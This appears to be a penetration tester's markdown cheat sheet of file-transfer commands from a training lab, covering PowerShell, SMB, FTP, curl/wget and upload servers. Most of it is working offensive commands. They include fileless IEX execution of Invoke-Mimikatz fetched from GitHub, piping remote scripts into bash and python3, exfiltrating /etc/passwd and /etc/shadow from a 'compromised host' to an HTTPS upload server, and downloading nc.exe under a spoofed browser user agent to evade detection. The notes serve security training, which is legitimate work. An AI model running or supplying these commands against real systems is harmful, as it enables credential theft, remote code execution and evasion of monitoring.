#files #cybersec #transfering #powershell #linux #http/s #download #upload
## Windows File transfer methods

##### encdoe ssh key to base64

1. generate hash of key
```bash 
md5sum id_rsa
```
2. encode key to base64
``` bash
cat id_rsa |base64 -w 0;echo
```
3. decode and write on windows host
``` powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("base64blob="))
```
4. confirm hash
``` powershell
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

#### powershell web download

| **Method**                                                                                                               | **Description**                                                                                                            |
| ------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------- |
| [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)                       | Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0). |
| [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)             | Returns the data from a resource without blocking the calling thread.                                                      |
| [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)               | Downloads data from a resource and returns a Byte array.                                                                   |
| [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)     | Downloads data from a resource and returns a Byte array without blocking the calling thread.                               |
| [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)               | Downloads data from a resource to a local file.                                                                            |
| [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)     | Downloads data from a resource to a local file without blocking the calling thread.                                        |
| [DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)           | Downloads a String from a resource and returns a String.                                                                   |
| [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) | Downloads a String from a resource without blocking the calling thread.                                                    |
###### examples:

``` powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
```

```powershell
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```

##### Fileless method using ps

``` powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```
or
```powershell
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

##### wget

```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

### SMB donwloads
```shell
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

<span style="background:#ff4d4f">New versions of Windows block unauthenticated guest access</span>

```shell
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```powershell  
net use n: \\192.168.220.133\share /user:test test
```

### FTP 

 #### Installing the FTP Server Python3 Module - pyftpdlib
 
```shell
sudo pip3 install pyftpdlib
```

```shell
sudo python3 -m pyftpdlib --port 21
```

#### Transferring Files from an FTP Server Using PowerShell

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt'
```

## Linux downlaods

#### wget
```shell
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

curl
```shell
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

### filles downloads

```shell
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

```shell
 wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```


### upload server

```shell
sudo python3 -m pip install --user uploadserver
```

#### Pwnbox - Create a Self-Signed Certificate

```shell
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

```shell
mkdir https && cd https
```

```shell
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

### from compromised host

```shell
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

#### Linux - Creating a Web Server with Python3

```shell
python3 -m http.server
```

## Miscellaneous File Transfer Methods

#### Mounting a Linux Folder Using rdesktop
```shell
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```
#### Mounting a Linux Folder Using xfreerdp
```shell
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```


# living of the land

## Using the LOLBAS and GTFOBins Project

LOLBAS  -> /upload , /download
GTFOBins > +file download or + file upload

## Evade detection

#### Listing out User Agents

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

#### Request with Chrome User Agent

```powershell

$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome

Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

LOLBAS & GTFOBINS

